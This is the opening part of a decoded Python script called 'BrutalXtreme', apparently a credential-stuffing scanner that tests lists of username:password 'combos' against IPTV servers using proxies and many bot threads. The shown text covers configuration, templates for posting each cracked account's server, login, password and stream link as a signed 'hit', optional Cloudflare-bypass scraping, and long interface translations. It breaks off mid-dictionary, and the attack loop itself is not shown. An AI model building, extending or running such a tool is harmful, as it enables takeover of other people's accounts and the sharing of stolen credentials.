# decoded by Unnamed
# -*- coding: utf-8 -*-
import time
import sys
import os
import subprocess
import json
import pathlib
import threading
import datetime
import random
import re
import queue
import logging
import socket
import urllib.request
import urllib.error
from urllib.parse import urlparse, unquote
from collections import defaultdict
import select
from concurrent.futures import ThreadPoolExecutor, as_completed
import base64

BASE_DIR = "/sdcard"
BRUTAL_DIR = os.path.join(BASE_DIR, "Brutal")
CONFIG_FILE = os.path.join(BRUTAL_DIR, "config.json")
LAYOUTS_FILE = os.path.join(BRUTAL_DIR, "layouts.json")
LAYOUTS_IMPORT_DIR = os.path.join(BRUTAL_DIR, "layouts_importar")
DEFAULT_CONFIG = {
    "theme": "color", "language": "pt", "nickname": "Brutal", "online_combos": [], "default_layout": ""
}
CONFIG = {}
HITS_DIR = os.path.join(BRUTAL_DIR, "Hits")
ORDERED_HITS_DIR = os.path.join(BRUTAL_DIR, "Ordenados")

# --- ESTRUTURA DE PASTAS ORIGINAL ---
COMBO_DIR = os.path.join(BASE_DIR, "combo")
LOCAL_PROXY_DIR = os.path.join(BASE_DIR, "proxy") 
SERVERS_DIR = os.path.join(BASE_DIR, "servidores")
COMBO_HITS_FILE = os.path.join(BRUTAL_DIR, "combo", "Combo_Hits.txt")
# --- FIM DA ESTRUTURA ---

DEFAULT_LAYOUTS = {
  "layouts": [
    {
      "nome_display": "BrutalXtreme",
      "template": [
        "𝘽░𝙧░𝙪░𝙩░𝙖░𝙡░ 𝗫░𝘁░𝗿░𝗲░𝗺░𝗲", "✘ Servidor➣ {host}", "✘ Usuário➣ {usuario}", "✘ Senha➣ {senha}", "✦ Expira➣ {expira_data}", "✦ Dias Restantes➣ {dias_restantes} Dias",
        "✦ Conexões➣ {conexoes_ativas}/{conexoes_max}", "⦻Canais({canais}) Filmes({filmes}) Séries({series})", "✪ Hits By ☛{nickname}☚", "⏣ Combo➣ {combo_nome}",
        "⏣ Horário➣ {hora} ⁃ Data➣ {data}", "⚉ Link M3U↷", "{link_m3u}", "▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂▂"
      ]
    },
    {
      "nome_display": "TopScan",
      "template": [
          "┏●-•~¹°”ˆ˜¨ 𝙏𝙤𝙥 𝙎𝙘𝙖𝙣𝙣𝙚𝙧ᵥ² ¨˜ˆ”°¹~•-", "┣─🌐Host ► {host}", "┣─📍IP do Host ► {ip_host}", "┣─🗺️Região ► {regiao}", "┣─🏢Hospedagem ► {isp}", "┣─👤Usuário ► {usuario}",
          "┣─🔒Senha ► {senha}", "┣─🟢Status ► {status}", "┣─🗓️Criado ► {criada_data}", "┣─⏳Expira ► {expira_data}", "┣─⌛Dias Restantes ► {dias_restantes} dias",
          "┣─📶Conexões Ativas ► {conexoes_ativas}", "┣─📊Conexōes Máximas ► {conexoes_max}", "┣─📺Canais ► {canais}", "┣─🎬Filmes ► {filmes}", "┣─🎞️Séries ► {series}",
          "┣─🎯Total Geral VOD ► {total_vod}", "┣─🔗Link M3u⭏", "┃ ► {link_m3u}", "┣─📄Combo ► {combo_nome}", "┣─👽Hits Por ► {nickname}", "┣─⏱️Scan ► {hora} ⁃ {data}", "┗●▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
      ]
    },
    {
      "nome_display": "Matrix Scan",
      "template": [
          " ┏▰▰▰⨰ᴍᴀᴛʀɪx sᴄᴀɴᵛ²⨰▰▰▰", "┏▚ Host► {host}", "┣▞ IP do Host► {ip_host}", "┣▚ Região► {regiao}", "┣▞ Hospedagem► {isp}", "┣▞ Usuário► {usuario}",
          "┣▚ Senha► {senha}", "┣▞ Status► {status}", "┣▚ Criado► {criada_completa}", "┣▞ Expira► {expira_completa}", "┣▚ Dias Restantes► {dias_restantes} dias",
          "┣▞ Conexões Ativas► {conexoes_ativas}", "┣▚ Conexōes Máximas► {conexoes_max}", "┣▞ Conteúdo🔞► {conteudo_adulto}", "┣▞ Canais► {canais}", "┣▞ Filmes► {filmes}",
          "┣▚ Séries► {series}", "┣▞ Link M3u⭛", "   {link_m3u}", "┣▞ Link Epg⭛", "   {link_epg}", "┣▞ Scan► {hora} ⁃ {data}", "┣▚ Combo► {combo_nome}",
          "┣▞ Hits By► {nickname}", " ┗●▬▬▬▬▬▬▬▬▬▬▬▬▬"
      ]
    },
    {
      "nome_display": "Ghost Scan",
      "template": [
        "┏•━•━•━•━•━•━•━•━•━•━•━•┓", "┃👻𝙂𝙝𝙤𝙨𝙩 𝙎𝙘𝙖𝙣 𝙄𝙋𝙏𝙑ᵥ➑👻", "┃ ◆⭑𝙀𝙭𝙩𝙧𝙚𝙢𝙚  𝙑𝙚𝙧𝙨𝙞𝙤𝙣⭑◆", "┣━•━•━•━•━ ✮ ━•━•━•━•━•┛", "┣◯Host► {host}", "┣◯Ip Host► {ip_host}", "┣◯Região► {regiao}",
        "┣◯Usuário► {usuario}", "┣◯Senha► {senha}", "┣⟣Criada► {criada_data}", "┣⟣Expira► {expira_data}", "┣⟣Dias Restante► {dias_restantes} Dias",
        "┣⟣Contas► Ativa: {conexoes_ativas} ⁃ Max: {conexoes_max}", "┣⟥Canais: {canais}", "┣⟥Filmes: {filmes}", "┣⟥Séries: {series}", "┣⟥Total Geral VOD: {total_vod}",
        "┏━━━━━━━ •✧• ━━━━━━━┓", "┣✘Link M3u↯", "  {link_m3u}", "┣✘Link Epg↯", "  {link_epg}", "┏━━━━━━━ •✧• ━━━━━━━┓", "┣✦Combo► {combo_nome}",
        "┣✭Hits By► {nickname}", "┣❍Hora► {hora}", "┣❍Data► {data}", "   ─ ✦──𝙄𝙋𝙏𝙑 𝙁𝙧𝙚𝙚──✦ ─", "┗━━━━━━━ •✧• ━━━━━━━┛"
      ]
    },
    {
      "nome_display": "Mestre_Thayson",
      "template": [
        " ╭━━━━━━━━┐",
        " ⚡️  𝐌𝐄𝐒𝐓𝐑𝐄🔱𝐓𝐇𝐀𝐘𝐒𝐎𝐍⚡️",
        " ╰━━━━━━━━┘",
        "╭∘CRIADOR ➨{nickname}",
        "╰∘DOMINIO ➨ {host}",
        "✎﹏﹏﹏﹏﹏﹏﹏﹏﹏﹏",
        "    ❪  𝗜𝗡𝗙𝗢  ❫",
        "╭∘HOST ➨ {host}",
        "╰∘PORTA ➨ {porta}",
        "╭∘IP ➨ {ip_host}",
        "╰∘HOSPEDAGEM ➨ {isp}",
        "╭∘REGIÃO ➨ {regiao}",
        "╰∘STATUS: {status}",
        "✎﹏﹏﹏﹏﹏﹏﹏﹏﹏﹏",
        " ❪  𝗨𝗦U𝗔𝗥𝗜𝗢🔱𝗦𝗘𝗡𝗛𝗔  ❫",
        "╭USUARIO ➨ {usuario}",
        "╰SENHA ➨ {senha}",
        "✎﹏﹏﹏﹏﹏﹏﹏﹏﹏﹏",
        "╭∘EXPIRA ➨ {expira_data} ({dias_restantes} dias)",
        "╰∘CONEXÕES: {conexoes_ativas}  / {conexoes_max}",
        "╭∘COMBO: {combo_nome}",
        "╰∘〽️3Us™",
        "✎﹏﹏﹏﹏﹏﹏﹏﹏﹏﹏",
        "(1)↬{link_m3u}",
        "✎﹏﹏﹏﹏﹏﹏﹏﹏﹏﹏",
        "(2)↬LINK EPG {link_epg}",
        "✎﹏﹏﹏﹏﹏﹏﹏﹏﹏﹏",
        "   ＲＡＩＯ⚡️ＮＥＧＲＯ"
      ]
    },
    {
      "nome_display": "Conexao_Estabelecida",
      "template": [
        "┌─▪️▪️▪️▪️▪️▪️▪️▪️┐",
        "   CONEXÃO ESTABELECIDA",
        "└─▪️▪️▪️▪️▪️▪️▪️▪️┘",
        "",
        "👤 **Acesso:**",
        "   » Usuário: {usuario}",
        "   » Senha: {senha}",
        "",
        "🗓️ **Validade:**",
        "   » Expira em: {expira_completa}",
        "",
        "📡 **Servidor:**",
        "   » IP: {ip_host}",
        "   » Região: {regiao}",
        "   » Conexões: {conexoes_ativas} de {conexoes_max}",
        "",
        "✨ **Grade de Conteúdo:**",
        "   » 📺 | Canais Ao Vivo: {canais}",
        "   » 🍿 | Filmes: {filmes}",
        "   » 🎬 | Séries: {series}",
        "",
        "🔗 **Links de Acesso:**",
        "   » M3U: {link_m3u}",
        "   » EPG: {link_epg}"
      ]
    },
    {
      "nome_display": "Ficha_De_Jogador",
      "template": [
        "█▓▒░ FICHA DE JOGADOR ░▒▓█",
        "",
        "» NICKNAME: {nickname}",
        "» CLASSE: Mestre do Streaming",
        "» GUILDA: {combo_nome}",
        "",
        "-=[ ATRIBUTOS DA CONTA ]=-",
        "› Login: {usuario}",
        "› Key: {senha}",
        "› HP (Validade): {dias_restantes} dias",
        "› Nível de Acesso: Máximo",
        "",
        "-=[ INVENTÁRIO DE MÍDIA ]=-",
        "› ⚔️ Canais de Batalha: {canais}",
        "› 📜 Pergaminhos (Filmes): {filmes}",
        "› 📚 Sagas (Séries): {series}",
        "",
        "-=[ PORTAL MÁGICO (LINK) ]=-",
        "› {link_m3u}",
        "",
        "-=[ MISSÃO INICIADA EM ]=-",
        "› {data} às {hora}"
      ]
    }
  ]
}
try:
    import requests
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    print("Instalando o pacote necessário (requests)...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
        import requests
        requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
    except Exception as e:
        print(f"Falha ao instalar pacotes. Erro: {e}")
        sys.exit(1)
try:
    import cfscrape
    CFSCRAPE_AVAILABLE = True
except ImportError:
    CFSCRAPE_AVAILABLE = False
TRANSLATIONS = {
    "pt": {
        "welcome": "Bem-vindo ao BrutalXtreme", "menu_main": "MENU PRINCIPAL", "start_scan": "Iniciar Scan", "settings": "Configurações", "exit": "Sair", "goodbye": "Saindo... Até a próxima!",
        "settings_title": "CONFIGURAÇÕES", "change_theme": "Alterar Tema", "change_language": "Alterar Idioma", "back": "Voltar", "theme_menu": "SELECIONAR TEMA", "theme_color": "Colorido",
        "theme_bw": "Preto e Branco", "lang_menu": "SELECIONAR IDIOMA", "lang_pt": "Português", "lang_en": "Inglês", "lang_es": "Español", "config_saved": "Configurações salvas com sucesso!",
        "theme_change_restart": "A mudança de tema só terá efeito após reiniciar o programa!", "server_title": "CONFIGURAÇÃO DE SERVIDORES", "server_option1": "Digitar Servidores Manualmente",
        "server_option2": "Carregar de um Arquivo (.txt)", "combo_title": "CONFIGURAÇÃO DE COMBO", "proxy_title": "CONFIGURAÇÃO DE PROXY", "proxy_question": "Deseja usar proxy neste scan? (s/N): ",
        "proxy_files": "Arquivos de proxy locais disponíveis:", "proxy_select_file": "» Selecione o arquivo: ", "proxy_type_question": "Qual o TIPO de proxy neste arquivo?",
        "proxy_check_question": "Deseja verificar os proxies para usar apenas os online? (s/N): ", "ordered_hits_title": "SALVAR HITS ORDENADOS", "ordered_hits_question": "Deseja salvar os Hits Ordenados por tempo de validade?",
        "ordered_hits_warning": "Os hits serão ordenados pelo tempo de validade e salvos em Brutal/Ordenados assim que o scan acabar.", "ordered_hits_option1": "Sim", "ordered_hits_option2": "Não (Padrão)",
        "ordered_hits_saved_success": "Hits ordenados salvos em:", "ordered_hits_saved_fail": "Falha ao salvar hits ordenados.", "bots_title": "CONFIGURAÇÃO DE BOTS",
        "bots_question": "» Bots POR SERVIDOR (padrão: 15): ", "scan_summary": "=============== RESUMO FINAL ===============", "scan_duration": "Duração Total...: {}", "scan_combo": "Combo(s)........: {}",
        "scan_tested": "Linhas Testadas.: {}", "scan_hits": "Total de Hits...: {}", "scan_bads": "Ruins...........: {}", "scan_errors": "Erros de Rede...: {}",
        "scan_hits_per_server": "--- HITS POR SERVIDOR ---", "scan_hits_server": "{}: {} hits", "scan_hits_saved": "Scan concluído. Hits salvos em:\n{}",
        "combo_hits_saved": "Combo de hits atualizado salvo em: {}", "aborted": "Configuração abortada.", "cancelled": "Operação cancelada pelo usuário.",
        "restart_question": "Deseja iniciar um novo scan? (s/N): ", "nickname_question": "» Informe seu Nickname (padrão: {}):\n ", "days": "Dias",
        "active": "Online", "inactive": "Inativo", "na": "N/A", "unlimited": "Ilimitado", "adult_yes": "Sim", "adult_no": "Não", "adult_na": "N/A", "connection_status": "Status da Conexão",
        "waiting": "Aguardando...", "last_test": "Último Teste", "proxy_checking": "Verificando Proxies Online", "proxy_checked": "Verificados: {}/{} ({}%)", "proxy_online_found": "Online Encontrados: {}",
        "proxy_bots": "Bots de Verificação: 100", "proxy_check_complete": "Verificação concluída. {} de {} proxies únicos estão online.", "proxy_no_files": "Nenhum arquivo de proxy encontrado em {}!",
        "proxy_invalid_type": "Tipo de proxy inválido.", "proxy_file_error": "Erro ao ler arquivo: {}", "proxy_invalid_selection": "Seleção de arquivo inválida.", "combo_downloading": "Aguarde, baixando o combo online...",
        "combo_downloading_wait": "Baixando...", "combo_download_fail": "✗ Falha na Conexão: {}", "combo_download_success": "✓ Combo Online Carregado com Sucesso!", "combo_total_accounts": "Total de Contas: {}",
        "combo_http_error": "✗ Erro HTTP {} ao baixar o combo online.", "combo_invalid_url": "URL inválida.", "invalid_option": "Opção inválida.",
        "combo_empty": "O combo está vazio ou nenhuma linha válida foi encontrada.", "combo_read_error": "Erro ao ler o arquivo: {}", "invalid_selection": "Seleção inválida.",
        "combo_loaded": "{} linhas carregadas de {}", "combo_online_failed": "A URL do combo online falhou.", "server_manual_instruction": "\nDigite até 5 servidores (ex: http://dominio.com:8080). Deixe em branco para finalizar.",
        "server_prompt": "Servidor {}: ", "server_checking": "Verificando {}...", "server_online_added": "✅ Servidor Online.", "server_offline": "⚠️ Servidor OFFLINE (Adicionado mesmo assim).",
        "server_no_files": "Nenhum arquivo de servidor encontrado em {}!\nPor favor, adicione arquivos .txt com servidores para usar esta opção.", "server_no_files_prompt": "Pressione Enter para voltar...",
        "server_files_available": "\nArquivos de servidores disponíveis:", "server_select_max": "\nServidores encontrados no arquivo. Selecione até 5 para o scan.", "server_select_indices": "» Digite os números dos servidores (ex: 1,3,5): ",
        "server_max_warning": "Você só pode selecionar no máximo 5 servidores. Usando os 5 primeiros.", "server_verifying": "\nVerificando servidores selecionados...", "server_online": "✅ {} - Online",
        "server_offline_server": "❌ {} - Offline", "server_online_count": "\n{} servidores online adicionados.", "server_none_valid": "Nenhum servidor válido foi configurado. Abortando.",
        "nickname": "Nickname", "combos_plural_label": "Combo(s)", "proxy": "Proxy", "proxy_ip": "IP do Proxy", "tested": "Testados", "speed": "Velocidade", "time": "Tempo", "hits": "Hits", "bads": "Ruins", "errors": "Erros",
        "bots": "Bots", "servers": "Servidores", "scan_interrupted": "\nSaindo do scan a pedido do usuário...", "scan_finishing": "\nFinalizando scan... Aguarde as threads terminarem.",
        "bots_invalid": "O número de bots deve ser maior que zero.", "proxy_online_option": "Proxy Online (Baixar da Internet)", "proxy_local_option": "Proxy Local (Carregar de Arquivo)",
        "proxy_no_use_option": "Não Usar Proxy", "proxy_online_title": "PROXIES ONLINE", "proxy_online_prompt": "Qual tipo de proxy online deseja baixar?", "manage_online_combos": "Gerenciar Combos Online",
        "no_combos_saved": "Nenhum combo online salvo.", "saved_combos": "Combos Salvos:", "add_new_combo": "Adicionar Novo Combo", "rename_combo": "Renomear um Combo", "delete_combo": "Excluir um Combo",
        "prompt_combo_name": "Digite um nome para o combo:", "prompt_combo_url": "Digite a URL do combo:", "combo_saved_success": "Combo '{}' salvo com sucesso!", "invalid_name_url": "Nome ou URL inválida. O combo não foi salvo.",
        "no_combos_rename": "Não há combos para renomear.", "prompt_rename_which": "Digite o número do combo para renomear:", "prompt_new_name": "Digite o novo nome para '{}':",
        "combo_renamed_success": "Combo renomeado com sucesso!", "name_not_empty": "O nome não pode ser vazio.", "invalid_input": "Entrada inválida.", "no_combos_delete": "Não há combos para excluir.",
        "prompt_delete_which": "Digite o número do combo para excluir:", "combo_deleted_success": "Combo '{}' excluído com sucesso!", "insert_temp_url": "Inserir uma URL temporária",
        "online_saved_section": "Combos Online Salvos", "local_combos_section": "Combos Locais (da pasta /combo/)", "other_online_options": "Outras Opções Online", "back_to_main_menu": "Voltar ao menu principal",
        "combo_online_default": "Combo Online Padrão (Recomendado)", "combo_type_title": "ESCOLHA O TIPO DE COMBO", "online_combos_menu": "Combos Online",
        "local_combos_menu": "Combos Locais (Pasta: {})", "manage_layouts": "Gerenciar Layouts de Hits", "layout_manager_title": "GERENCIADOR DE LAYOUTS",
        "rename_layout": "Renomear um Layout", "delete_layout": "Excluir um Layout", "layout_saved_success": "Layout '{}' salvo com sucesso!",
        "layout_deleted_success": "Layout '{}' excluído com sucesso!", "layout_renamed_success": "Layout renomeado com sucesso!",
        "layout_preview_title": "--- PRÉ-VISUALIZAÇÃO DO HIT ---", "layout_confirm_correct": "O template está correto e pronto para salvar? (S/N):",
        "placeholders_help_title": "--- PLACEHOLDERS DISPONÍVEIS ---",
        "layout_model_empty": "O modelo não pode estar vazio.",
        "layout_select_title": "CONFIGURAÇÃO DE LAYOUT", "set_default_layout": "Definir Layout Padrão", "set_default_layout_title": "DEFINIR LAYOUT PADRÃO", "current_default_indicator": "(Padrão Atual)",
        "prompt_select_new_default": "Digite o número do layout para definir como padrão (ou Enter para cancelar):", "default_layout_set_success": "Layout '{}' definido como padrão!",
        "using_default_layout_info": "Usando layout padrão: '{}'", "prompt_use_default_or_choose": "O que deseja fazer?", "option_use_default": "Usar o padrão", "option_choose_another": "Escolher outro",
        "layout_per_server_q": "Você selecionou {} servidores. Deseja usar um layout diferente para cada um? (S/N):", "configuring_layout_for": "Configurando layout para o servidor: {}",
        "choose_layout_for_this_server": "» Escolha o layout para ESTE servidor:", "layouts_summary_title": "RESUMO DOS LAYOUTS", "layouts_summary_line": "✔ {} usará o layout: '{}'",
        "no_default_layout": "Nenhum layout padrão definido.", "choose_one_for_all_or_each": "Deseja usar um único layout para todos os servidores ou um diferente para cada um?",
        "option_one_for_all": "Usar um único layout para todos", "option_one_for_each": "Escolher um layout para cada servidor", "please_choose_layout_for": "Por favor, escolha o layout que será usado para o scan:",
        "ph_host": "URL completa do servidor (http://servidor.com:8080)", "ph_porta": "Porta do servidor (8080)", "ph_usuario": "Nome de usuário da conta", "ph_senha": "Senha da conta", "ph_ip_host": "Endereço de IP do servidor",
        "ph_regiao": "Cidade e bandeira do país do servidor", "ph_isp": "Provedor de internet (hospedagem)", "ph_status": "Status da conta (ex: Online)", "ph_criada_data": "Data de criação (DD/MM/AAAA)",
        "ph_criada_completa": "Data e hora de criação", "ph_expira_data": "Data de expiração (DD/MM/AAAA)", "ph_expira_completa": "Data e hora de expiração", "ph_dias_restantes": "Número de dias restantes",
        "ph_conexoes_ativas": "Conexões em uso", "ph_conexoes_max": "Máximo de conexões permitidas", "ph_canais": "Número total de canais", "ph_filmes": "Número total de filmes", "ph_series": "Número total de séries",
        "ph_total_vod": "Soma de canais, filmes e séries", "ph_conteudo_adulto": "'Sim' ou 'Não'", "ph_link_m3u": "Link M3U completo", "ph_link_epg": "Link EPG completo",
        "ph_nickname": "Seu nickname (configurado no Scan)", "ph_combo_nome": "Nome do combo usado no Scan", "ph_data": "Data do hit (DD/MM/AAAA)", "ph_hora": "Hora do hit (HH:MM:SS)",
        "press_enter_continue": "Pressione Enter para continuar...", "proxy_downloading": "Baixando proxies {}...", "proxy_source_download": "Baixando da fonte: {}", "proxy_source_fail": "Falha ao baixar de {}", "proxy_source_found": "Encontrados {} proxies.", "proxy_download_complete": "Download de proxies concluído. Total de {} proxies únicos.", "no_layouts_to_edit": "Nenhum layout para modificar.",
        "import_layout_menu": "Importar de Arquivo (.txt)", "import_layout_title": "IMPORTAR LAYOUT DE ARQUIVO", "no_import_files": "Nenhum arquivo .txt encontrado em {}", "select_import_file": "» Selecione o arquivo para importar:",
        "layout_analysis_title": "--- ANÁLISE DO LAYOUT '{}' ---", "recognized_placeholders": "✅ Funções Reconhecidas ({}):", "missing_placeholders": "⚠️ Funções Ausentes (Opcionais):",
        "invalid_placeholders": "❌ Funções Inválidas (Serão ignoradas):", "preview_error_title": "ERRO: O sistema não conseguiu gerar a pré-visualização!",
        "preview_error_desc": "Isso geralmente acontece por um erro de formatação no template (ex: uma chave `}` ou `{` sobrando).",
        "confirm_save_anyway": "Deseja salvar este layout mesmo assim?\nVocê poderá corrigir o template manualmente no arquivo layouts.json depois. (S/N):",
        "layout_import_cancelled": "Importação de layout cancelada.", "tutorial_title": "TUTORIAL DE CRIAÇÃO DE LAYOUTS",
        "tutorial_intro": "A maneira mais fácil e segura de adicionar layouts é criando arquivos de texto.",
        "tutorial_step1_title": "1. Vá para a Pasta de Importação:",
        "tutorial_step1_desc": "Navegue até a pasta 'Brutal/layouts_importar/'.",
        "tutorial_step2_title": "2. Crie um Arquivo .txt:",
        "tutorial_step2_desc": "Crie um novo arquivo de texto (ex: MeuLayoutTop.txt). O nome do arquivo será o nome do seu layout.",
        "tutorial_step3_title": "3. Monte e Salve seu Layout:",
        "tutorial_step3_desc": "Abra o arquivo .txt e cole ou escreva seu modelo de hit, usando os placeholders da lista abaixo. Salve o arquivo.",
        "tutorial_step4_title": "4. Use a Opção de Importar:",
        "tutorial_step4_desc": "No Gerenciador de Layouts, use a opção 'Importar de Arquivo'. O sistema vai analisar, mostrar uma prévia e salvar seu layout no lugar certo.",
        "tutorial_conclusion": "Dessa forma, você pode editar seus layouts em um editor de texto de forma fácil e segura, sem precisar colar no terminal!",
        "tutorial_example_title": "Exemplo Prático:",
        "tutorial_example_content": "Seu arquivo `MeuLayout.txt` poderia ter o seguinte conteúdo:\n\n🌟 NOVO HIT - {nickname} 🌟\n🔗 Servidor: {host}\n👤 {usuario}:{senha}\n⏳ Expira em: {dias_restantes} dias\n\nO sistema vai entender e substituir os `{placeholders}` pelas informações reais do hit.",
        "servers_status_title": "======== STATUS DOS SERVIDORES ========",
        "scan_progress_title": "Progresso do Scan",
        "progress": "Progresso",
        "eta_geral": "ETA Geral",
        "combo_selection_title": "CONFIGURAÇÃO DE COMBOS PARA {}",
        "combo_files_found": "Arquivos de combo encontrados em {}",
        "combo_select_prompt": "» Digite os números dos arquivos (ex: 1 ou 1,2 para juntar):",
        "combos_loaded_and_merged": "{} linhas únicas carregadas e combinadas.",
        "no_combo_files_found": "Nenhum arquivo de combo encontrado na pasta {}. Por favor, adicione arquivos .txt.",
        "use_same_combo_q": "Deseja usar o(s) mesmo(s) combo(s) ('{}') para o servidor '{}'? (S/N):",
        "combo_in_use": "Combo(s) em Uso",
        "combo_assembly_title": "--- Montador de Combo para {} ---",
        "current_lines": "Linhas Atuais no Combo: {}",
        "add_from_local": "Adicionar de Combos Locais",
        "add_from_online": "Adicionar de Combos Online",
        "finish_combo_assembly": "Finalizar e Usar Este Combo",
        "lines_added": "✓ {} linhas adicionadas.",
        "add_combos_first": "Você precisa adicionar combos antes de finalizar.",
        "theme_menu_intro": "Por favor, escolha um tema visual para a interface.",
        "recommended": "Recomendado",
        "theme_color_desc": "Interface vibrante com um esquema de cores completo.",
        "theme_bw_desc": "Interface limpa e minimalista, ideal para terminais sem suporte a cores.",
        "enter_choice": "Digite sua escolha ({} ou {}):",
        "setup_complete": "CONFIGURAÇÃO INICIAL CONCLUÍDA",
        "prefs_saved": "Suas preferências foram salvas.",
        "program_start": "O programa será iniciado agora.",
        "status_ok": "OK",
        "status_client_error": "Erro do Cliente",
        "status_server_error": "Erro do Servidor",
        "status_error": "ERRO"
    },
    "en": {
        "welcome": "Welcome to BrutalXtreme", "menu_main": "MAIN MENU", "start_scan": "Start Scan", "settings": "Settings", "exit": "Exit", "goodbye": "Exiting... See you next time!", "settings_title": "SETTINGS",
        "change_theme": "Change Theme", "change_language": "Change Language", "back": "Back", "theme_menu": "SELECT THEME", "theme_color": "Colored", "theme_bw": "Black and White",
        "lang_menu": "SELECT LANGUAGE", "lang_pt": "Portuguese", "lang_en": "English", "lang_es": "Spanish", "config_saved": "Settings saved successfully!",
        "theme_change_restart": "Theme change will take effect after restarting the program!", "server_title": "SERVER CONFIGURATION", "server_option1": "Enter Servers Manually",
        "server_option2": "Load from a File (.txt)", "combo_title": "COMBO CONFIGURATION", "proxy_title": "PROXY CONFIGURATION", "proxy_question": "Do you want to use proxy in this scan? (y/N): ",
        "proxy_files": "Local proxy files available:", "proxy_select_file": "» Select file: ", "proxy_type_question": "What is the TYPE of proxy in this file?", "proxy_check_question": "Do you want to verify the proxies to use only online ones? (y/N): ",
        "ordered_hits_title": "SAVE ORDERED HITS", "ordered_hits_question": "Do you want to save Hits Ordered by validity time?", "ordered_hits_warning": "The hits will be sorted by expiration time and saved in Brutal/Ordenados once the scan is finished.",
        "ordered_hits_option1": "Yes", "ordered_hits_option2": "No (Default)", "ordered_hits_saved_success": "Ordered hits saved at:", "ordered_hits_saved_fail": "Failed to save ordered hits.",
        "bots_title": "BOTS CONFIGURATION", "bots_question": "» Bots PER SERVER (default: 15): ", "scan_summary": "=============== FINAL SUMMARY ===============", "scan_duration": "Total Duration...: {}",
        "scan_combo": "Combo(s).........: {}", "scan_tested": "Lines Tested....: {}", "scan_hits": "Total Hits......: {}", "scan_bads": "Bads............: {}", "scan_errors": "Network Errors..: {}",
        "scan_hits_per_server": "--- HITS PER SERVER ---", "scan_hits_server": "{}: {} hits", "scan_hits_saved": "Scan completed. Hits saved at:\n{}", "combo_hits_saved": "Updated hits combo saved at: {}",
        "aborted": "Configuration aborted.", "cancelled": "Operation cancelled by user.", "restart_question": "Do you want to start a new scan? (y/N): ", "nickname_question": "» Enter your Nickname (default: {}):\n ",
        "days": "Days", "active": "Online", "inactive": "Inactive", "na": "N/A", "unlimited": "Unlimited", "adult_yes": "Yes", "adult_no": "No", "adult_na": "N/A", "connection_status": "Connection Status",
        "waiting": "Waiting...", "last_test": "Last Test", "proxy_checking": "Checking Online Proxies", "proxy_checked": "Checked: {}/{} ({}%)", "proxy_online_found": "Online Found: {}",
        "proxy_bots": "Verification Bots: 100", "proxy_check_complete": "Verification completed. {} of {} unique proxies are online.", "proxy_no_files": "No server files found in {}!",
        "proxy_invalid_type": "Invalid proxy type.", "proxy_file_error": "Error reading file: {}", "proxy_invalid_selection": "Invalid file selection.", "combo_downloading": "Please wait, downloading online combo...",
        "combo_downloading_wait": "Downloading...", "combo_download_fail": "✗ Connection Failed: {}", "combo_download_success": "✓ Online Combo Loaded Successfully!", "combo_total_accounts": "Total Accounts: {}",
        "combo_http_error": "✗ HTTP Error {} downloading online combo.", "combo_invalid_url": "Invalid URL.", "invalid_option": "Invalid option.", "combo_empty": "The combo is empty or no valid lines were found.",
        "combo_read_error": "Error reading file: {}", "invalid_selection": "Invalid selection.", "combo_loaded": "{} lines loaded from {}", "combo_online_failed": "Online combo URL failed.",
        "server_manual_instruction": "\nEnter up to 5 servers (ex: http://domain.com:8080). Leave blank to finish.", "server_prompt": "Server {}: ", "server_checking": "Checking {}...",
        "server_online_added": "✅ Server Online.", "server_offline": "⚠️ Server OFFLINE (Added anyway).", "server_no_files_prompt": "Press Enter to go back...", "server_files_available": "\nAvailable server files:",
        "server_select_max": "\nServers found in file. Select up to 5 for scanning.", "server_select_indices": "» Enter server numbers (ex: 1,3,5): ", "server_max_warning": "You can only select up to 5 servers. Using first 5.",
        "server_verifying": "\nVerifying selected servers...", "server_online": "✅ {} - Online", "server_offline_server": "❌ {} - Offline", "server_online_count": "\n{} online servers added.",
        "server_none_valid": "No valid servers configured. Aborting.", "nickname": "Nickname", "combos_plural_label": "Combo(s)", "proxy": "Proxy", "proxy_ip": "Proxy IP", "tested": "Tested", "speed": "Speed",
        "time": "Time", "hits": "Hits", "bads": "Bads", "errors": "Errors", "bots": "Bots", "servers": "Servers", "scan_interrupted": "\nExiting scan as requested by user...",
        "scan_finishing": "\nFinishing scan... Waiting for threads to complete.", "bots_invalid": "Number of bots must be greater than zero.", "proxy_online_option": "Online Proxies (Download from Internet)",
        "proxy_local_option": "Local Proxies (Load from File)", "proxy_no_use_option": "Don't Use Proxy", "proxy_online_title": "ONLINE PROXIES", "proxy_online_prompt": "What type of online proxy do you want to download?",
        "manage_online_combos": "MANAGE ONLINE COMBOS", "no_combos_saved": "No saved online combos.", "saved_combos": "Saved Combos:", "add_new_combo": "Add New Combo", "rename_combo": "Rename a Combo",
        "delete_combo": "Delete a Combo", "prompt_combo_name": "Enter a name for the combo:", "prompt_combo_url": "Enter the combo URL:", "combo_saved_success": "Combo '{}' saved successfully!",
        "invalid_name_url": "Invalid name or URL. The combo was not saved.", "no_combos_rename": "There are no combos to rename.", "prompt_rename_which": "Enter the number of the combo to rename:",
        "prompt_new_name": "Enter the new name for '{}':", "combo_renamed_success": "Combo renamed successfully!", "name_not_empty": "The name cannot be empty.", "invalid_input": "Invalid input.",
        "no_combos_delete": "There are no combos to delete.", "prompt_delete_which": "Enter the number of the combo to delete:", "combo_deleted_success": "Combo '{}' deleted successfully!",
        "insert_temp_url": "Insert a temporary URL", "online_saved_section": "Saved Online Combos", "local_combos_section": "Local Combos (from /combo/ folder)", "other_online_options": "Other Online Options",
        "back_to_main_menu": "Back to main menu", "combo_online_default": "Default Online Combo (Recommended)", "combo_type_title": "CHOOSE THE COMBO TYPE", "online_combos_menu": "Online Combos",
        "local_combos_menu": "Local Combos (Folder: {})", "manage_layouts": "Manage Hit Layouts", "layout_manager_title": "LAYOUT MANAGER", "rename_layout": "Rename a Layout", "delete_layout": "Delete a Layout",
        "layout_saved_success": "Layout '{}' saved successfully!",
        "layout_deleted_success": "Layout '{}' deleted successfully!", "layout_renamed_success": "Layout renamed successfully!",
        "layout_preview_title": "--- HIT PREVIEW ---", "layout_confirm_correct": "Is the template correct and ready to save? (Y/N):",
        "placeholders_help_title": "--- AVAILABLE PLACEHOLDERS ---",
        "layout_model_empty": "The model cannot be empty.",
